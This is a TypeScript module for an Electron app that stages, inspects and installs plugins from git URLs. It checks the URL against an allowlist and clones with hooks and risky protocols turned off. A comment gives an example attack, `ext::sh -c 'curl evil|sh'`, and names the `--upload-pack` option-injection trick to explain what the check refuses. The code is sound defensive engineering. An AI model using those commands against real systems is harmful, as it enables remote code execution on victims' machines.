import { app } from 'electron'
import { execFile } from 'child_process'
import { existsSync, mkdirSync, readFileSync, rmSync, readdirSync, statSync } from 'fs'
import { join } from 'path'
import { randomUUID } from 'crypto'
import { probeRequirements, coerceRequirements, type RequirementResult } from './capability-requires'
import { messageOf } from './guarded'

// INSTALLING A PLUGIN FROM A URL — fetch, then SHOW, then commit.
//
// The gap. DUIN could already reach open-source programs, but only ones the operator
// had already put on the machine: the install flow offered "pick a local directory",
// "paste JSON", or "re-install something we shipped". So every open-source tool
// arrived by the operator cloning it by hand and then pointing a file picker at the
// folder. This closes that, and it is the reason the whole `requires` mechanism was
// built first — a remote plugin that needs something absent must say so at review
// time, not after it is installed and quietly not working.
//
// WHY THIS IS A TWO-STEP AND NEVER ONE CLICK. A plugin's connectors.json can declare
// an MCP stdio server, and an MCP stdio server is an arbitrary command line that
// DUIN spawns. So "install a plugin from a URL someone sent me" is, in the worst
// case, "run this command". A one-click install would make a pasted link equivalent
// to a pasted shell command, which is not a trade this app gets to make on the
// operator's behalf — least of all one running with full computer access.
//
// So: STAGE (clone into a scratch dir, touching nothing live) → INSPECT (parse it and
// return every command it would ever spawn, verbatim, plus its probed requirements) →
// the operator reads that → COMMIT. Staged content never loads, is never scanned by
// the skill or MCP loaders, and is deleted on discard.
//
// AND IT LANDS DISABLED. Plugin-owned connectors are derived with `enabled: true` by
// refreshPluginConnectors, so an enabled plugin's servers start on the next refresh.
// The plugin's OWN enabled flag is therefore the real gate, and a remote install
// writes it false. The operator turns it on after reading what it runs — a second,
// deliberate act, in a surface that shows the same command list.

/** How long a clone may take before it is killed. A wedged clone must not hang the
 *  install dialog forever; a legitimate shallow clone of a plugin is seconds. */
const CLONE_TIMEOUT_MS = 60_000
/** Refuse absurd payloads: a plugin is text and small. This is the cheap backstop
 *  against a repo that is actually a 4 GB dataset. */
const MAX_STAGED_BYTES = 64 * 1024 * 1024
const MAX_STAGED_FILES = 4000

export interface StagedConnector {
  id: string
  name: string
  transport: string
  /** The command line VERBATIM, exactly as it would be spawned. Never prettified,
   *  never truncated in the data layer — the operator is being asked to approve
   *  this specific string and a cosmetic edit here would make the review a lie. */
  commandLine?: string
  url?: string
  /** Env keys the connector declares. VALUES ARE NEVER RETURNED — a repo could ship
   *  a connectors.json with a credential in it, and echoing that into the renderer,
   *  the logs and a screenshot is not something a review screen should do. */
  envKeys: string[]
  missing: RequirementResult[]
}

export interface StagedPlugin {
  /** Handle for commit/discard. Not the plugin id — the plugin id is not trustworthy
   *  until the manifest has been parsed, and two stages of the same repo must not
   *  collide. */
  stageId: string
  sourceUrl: string
  id: string
  name: string
  description: string
  version: string
  author?: string
  homepage?: string
  /** Everything this plugin would be able to spawn, for the review screen. */
  connectors: StagedConnector[]
  skills: string[]
  slashCommands: string[]
  /** The plugin's own declared requirements, probed against this machine. */
  missing: RequirementResult[]
  /** True when a plugin with this id is already installed — commit will refuse. */
  alreadyInstalled: boolean
}

/**
 * Is this URL safe to hand to `git clone`?
 *
 * This is a SECURITY boundary, not validation politeness. Two families of git URL
 * execute code on the CLONING machine before anything is reviewed:
 *
 *   - `ext::` transports run a shell command by design. `git clone "ext::sh -c
 *     'curl evil|sh'"` is remote code execution with no repository involved at all.
 *   - A leading `-` makes git read the URL as an OPTION. `--upload-pack=<cmd>` (and
 *     `-u<cmd>`) run that command. execFile passes argv without a shell, which stops
 *     shell metacharacters but does NOT stop an argument being parsed as a flag.
 *
 * So this is an ALLOWLIST — https and ssh only — rather than a denylist of the two
 * tricks above, because the next trick is not on the list yet. Local paths and
 * `file://` are refused too: cloning a local path is what the directory picker is
 * for, and it is the shape most likely to be a traversal attempt.
 *
 * Pure and exported so the rule is testable without a network or a git binary.
 */
export function isAllowedRepoUrl(raw: string): { ok: true; url: string } | { ok: false; error: string } {
  const url = (raw ?? '').trim()
  if (!url) return { ok: false, error: 'Enter a repository URL.' }
  if (url.startsWith('-')) {
    return { ok: false, error: 'A URL cannot start with "-" — git would read it as an option.' }
  }
  if (/^[a-z0-9+.-]*ext::/i.test(url) || url.toLowerCase().startsWith('ext::')) {
    return { ok: false, error: 'ext:: URLs run a shell command. Refused.' }
  }
  // scp-style ssh shorthand: git@host:owner/repo.git
  if (/^[A-Za-z0-9._-]+@[A-Za-z0-9.-]+:[A-Za-z0-9._~\-/]+$/.test(url)) {
    return { ok: true, url }
  }
  let parsed: URL
  try {
    parsed = new URL(url)
  } catch {
    return { ok: false, error: 'Not a valid URL. Use an https:// repository URL.' }
  }
  const scheme = parsed.protocol.toLowerCase()
  if (scheme !== 'https:' && scheme !== 'ssh:') {
    return {
      ok: false,
      error: `Only https:// and ssh:// repositories are allowed (got "${parsed.protocol.replace(':', '')}").`
    }
  }
  if (!parsed.hostname) return { ok: false, error: 'The URL has no host.' }
  return { ok: true, url }
}

function stagingRoot(): string {
  const dir = join(app.getPath('userData'), 'plugin-staging')
  if (!existsSync(dir)) mkdirSync(dir, { recursive: true })
  return dir
}

function stageDir(stageId: string): string {
  return join(stagingRoot(), stageId)
}

/** Shallow clone, no submodules, no hooks, bounded. */
function cloneInto(url: string, dest: string): Promise<void> {
  return new Promise((resolve, reject) => {
    const child = execFile(
      'git',
      [
        'clone',
        '--depth', '1',
        // A submodule is a second URL the operator never saw and never approved.
        '--no-recurse-submodules',
        // Refuse to run any hook the clone might otherwise trigger, and refuse to
        // read repo-supplied config as instructions.
        '-c', 'core.hooksPath=/dev/null',
        '-c', 'protocol.ext.allow=never',
        '-c', 'protocol.file.allow=never',
        // `--` so a URL that still resembles a flag is bound as a positional.
        '--',
        url,
        dest
      ],
      { timeout: CLONE_TIMEOUT_MS, windowsHide: true, maxBuffer: 1024 * 1024 },
      (err, _stdout, stderr) => {
        if (err) {
          const detail = String(stderr ?? '').trim().split('\n').slice(-3).join(' ')
          reject(new Error(detail || messageOf(err)))
          return
        }
        resolve()
      }
    )
    child.on('error', reject)
  })
}

/** Walk the staged tree once for the size/count backstop. */
function measureTree(dir: string): { bytes: number; files: number } {
  let bytes = 0
  let files = 0
  const walk = (d: string): void => {
    if (files > MAX_STAGED_FILES) return
    for (const entry of readdirSync(d)) {
      const full = join(d, entry)
      let st: ReturnType<typeof statSync>
      try {
        st = statSync(full)
      } catch {
        continue
      }
      if (st.isDirectory()) walk(full)
      else {
        files++
        bytes += st.size
        if (files > MAX_STAGED_FILES || bytes > MAX_STAGED_BYTES) return
      }
    }
  }
  walk(dir)
  return { bytes, files }
}

function listMarkdown(dir: string): string[] {
  if (!existsSync(dir)) return []
  try {
    return readdirSync(dir)
      .filter((f) => f.toLowerCase().endsWith('.md') || existsSync(join(dir, f, 'skill.md')))
      .sort()
  } catch {
    return []
  }
}

/**
 * Read a staged directory into the review report.
 *
 * Everything here is READ-ONLY and tolerant: a malformed connectors.json yields no
 * connectors rather than an error, because the operator still needs to see the rest
 * of what they are being offered. The one thing that MUST be right is the command
 * list — an entry that cannot be understood is still listed, with whatever command
 * string it carries, rather than silently dropped.
 */
export function inspectStaged(dir: string, stageId: string, sourceUrl: string, installedIds: Set<string>): StagedPlugin | { error: string } {
  const manifestPath = join(dir, 'plugin.json')
  if (!existsSync(manifestPath)) {
    return { error: 'No plugin.json at the repository root — this is not a DUIN plugin.' }
  }
  let manifest: Record<string, unknown>
  try {
    manifest = JSON.parse(readFileSync(manifestPath, 'utf-8')) as Record<string, unknown>
  } catch (err) {
    return { error: `plugin.json is not valid JSON: ${messageOf(err)}` }
  }
  const id = typeof manifest.id === 'string' ? manifest.id.trim() : ''
  if (!id || !/^[a-z0-9][a-z0-9-]*$/.test(id)) {
    return { error: 'plugin.json has no valid "id" (lowercase letters, digits, dashes).' }
  }

  const connectors: StagedConnector[] = []
  const connectorsPath = join(dir, 'connectors.json')
  if (existsSync(connectorsPath)) {
    try {
      const parsed = JSON.parse(readFileSync(connectorsPath, 'utf-8'))
      if (Array.isArray(parsed)) {
        for (const raw of parsed) {
          if (!raw || typeof raw !== 'object') continue
          const o = raw as Record<string, unknown>
          const args = Array.isArray(o.args)
            ? o.args.filter((a): a is string => typeof a === 'string')
            : []
          const command = typeof o.command === 'string' ? o.command : undefined
          const env = o.env && typeof o.env === 'object' && !Array.isArray(o.env)
            ? Object.keys(o.env as Record<string, unknown>)
            : []
          connectors.push({
            id: typeof o.id === 'string' ? o.id : '(unnamed)',
            name: typeof o.name === 'string' ? o.name : (typeof o.id === 'string' ? o.id : '(unnamed)'),
            transport: typeof o.transport === 'string' ? o.transport : 'stdio',
            commandLine: command ? [command, ...args].join(' ') : undefined,
            url: typeof o.url === 'string' ? o.url : undefined,
            envKeys: env,
            missing: probeRequirements(coerceRequirements(o.requires), { baseDir: dir }).missing
          })
        }
      }
    } catch {
      // Listed as "unreadable" rather than hidden — see the docblock.
      connectors.push({
        id: '(unreadable)',
        name: 'connectors.json could not be parsed',
        transport: 'unknown',
        envKeys: [],
        missing: []
      })
    }
  }

  return {
    stageId,
    sourceUrl,
    id,
    name: typeof manifest.name === 'string' && manifest.name.trim() ? manifest.name.trim() : id,
    description: typeof manifest.description === 'string' ? manifest.description : '',
    version: typeof manifest.version === 'string' && manifest.version.trim() ? manifest.version.trim() : '0.0.0',
    author: typeof manifest.author === 'string' ? manifest.author : undefined,
    homepage: typeof manifest.homepage === 'string' ? manifest.homepage : undefined,
    connectors,
    skills: listMarkdown(join(dir, 'skills')),
    slashCommands: listMarkdown(join(dir, 'slash-commands')),
    missing: probeRequirements(coerceRequirements(manifest.requires), { baseDir: dir }).missing,
    alreadyInstalled: installedIds.has(id)
  }
}

/**
 * Clone a plugin repo into staging and return what it contains. Installs nothing.
 */
export async function stageFromUrl(
  rawUrl: string,
  installedIds: Set<string>
): Promise<{ ok: true; staged: StagedPlugin } | { ok: false; error: string }> {
  const allowed = isAllowedRepoUrl(rawUrl)
  if (!allowed.ok) return { ok: false, error: allowed.error }

  // `git` is itself a requirement, and now there is a mechanism that says so.
  const gitReport = probeRequirements([
    { kind: 'binary', name: 'git', hint: 'Install Git (git-scm.com), then try again.' }
  ])
  if (!gitReport.satisfied) {
    return { ok: false, error: gitReport.missing[0]?.detail ?? 'git is not installed.' }
  }

  const stageId = randomUUID()
  const dest = stageDir(stageId)
  try {
    await cloneInto(allowed.url, dest)
  } catch (err) {
    rmSync(dest, { recursive: true, force: true })
    return { ok: false, error: `Clone failed: ${messageOf(err)}` }
  }

  const size = measureTree(dest)
  if (size.files > MAX_STAGED_FILES || size.bytes > MAX_STAGED_BYTES) {
    rmSync(dest, { recursive: true, force: true })
    return {
      ok: false,
      error: `That repository is too large for a plugin (${size.files} files, ${Math.round(size.bytes / 1e6)} MB). Plugins are text bundles.`
    }
  }

  const report = inspectStaged(dest, stageId, allowed.url, installedIds)
  if ('error' in report) {
    rmSync(dest, { recursive: true, force: true })
    return { ok: false, error: report.error }
  }
  return { ok: true, staged: report }
}

/** Absolute path of a staged directory, for the caller that commits it. */
export function stagedPath(stageId: string): string | null {
  // Reject anything that is not a plain uuid before it reaches a path join — a
  // stageId arrives over IPC and must never be able to name a directory elsewhere.
  if (!/^[0-9a-f-]{36}$/i.test(stageId)) return null
  const dir = stageDir(stageId)
  return existsSync(dir) ? dir : null
}

export function discardStaged(stageId: string): boolean {
  const dir = stagedPath(stageId)
  if (!dir) return false
  rmSync(dir, { recursive: true, force: true })
  return true
}

/** Delete every staged directory. Called at boot: staging is scratch, and a stage
 *  left behind by a crash or a quit-mid-review is not a pending decision. */
export function clearAllStaging(): void {
  try {
    const root = stagingRoot()
    for (const entry of readdirSync(root)) {
      rmSync(join(root, entry), { recursive: true, force: true })
    }
  } catch (err) {
    console.error('[plugin-install-remote] failed to clear staging:', messageOf(err))
  }
}
